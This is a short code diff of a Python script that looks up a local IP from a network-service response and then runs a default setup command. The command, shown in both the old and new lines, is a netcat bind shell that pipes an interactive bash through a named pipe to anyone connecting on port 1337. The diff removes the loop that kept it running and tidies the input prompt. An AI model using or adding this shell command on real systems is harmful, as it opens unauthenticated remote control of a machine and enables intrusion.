@@ -84,10 +84,9 @@ d = json.loads(response.text)
 local_ip = d.get('ipAssignments')[0]
 print(f'local IP: {local_ip}')
 
-command_default = 'while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f; sleep 1; done'
+command_default = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f'
 print(f'Default command on setup: "{command_default}"')
-print(f'Enter command to run or [Enter for default]:\t')
-command = input()
+command = input(f'Enter command to run or [Enter for default]:\t')
 if command:
     command_default = command
 
